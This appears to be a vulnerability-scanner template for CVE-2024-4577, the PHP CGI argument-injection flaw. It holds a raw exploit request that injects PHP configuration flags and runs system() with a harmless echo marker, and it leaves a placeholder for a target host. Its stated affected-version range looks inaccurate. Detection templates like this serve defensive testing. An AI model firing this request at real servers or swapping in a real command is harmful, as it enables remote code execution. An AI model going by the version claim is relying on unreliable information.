id: CVE-2024-4577
info:
  name: PHP CGI Argument Injection RCE
  author: gaurang
  severity: critical
  description: |
    A critical vulnerability in PHP's CGI implementation allows remote attackers to execute 
    arbitrary code through command injection. The vulnerability exists due to improper handling 
    of command-line arguments in PHP CGI, which can be exploited to bypass security restrictions 
    and execute arbitrary commands with the privileges of the web server. This vulnerability 
    affects all PHP versions before 8.3.4, 8.2.17, and 8.1.27.
    References:
    - https://nvd.nist.gov/vuln/detail/cve-2024-4577
    - https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure
    - https://www.tarlogic.com/blog/cve-2024-4577-critical-vulnerability-php/
    - https://learn.microsoft.com/en-us/answers/questions/1725847/php-8-3-vulnerability-cve-2024-4577
    - https://www.stormshield.com/news/security-alert-php-cve-2024-4577-stormshields-product-response/
  tags: cve,rce,exploit,php

http:
  - raw:
      - |
        POST /php-cgi/php-cgi.exe?-d%20cgi.force_redirect=0+-d%20cgi.redirect_status_env=0+-d%20fastcgi.impersonate=1+-d%20auto_prepend_file=php://input+-d%20allow_url_include=1+-d%20allow_url_fopen=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <?php\necho '[START]';\nsystem('echo CVE-2024-4577-TEST');\necho '[END]';\ndie();
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[START]CVE-2024-4577-TEST[END]"
      - type: status
        status:
          - 200

variables:
  Hostname: "example.com"  # Replace with target hostname or IP.
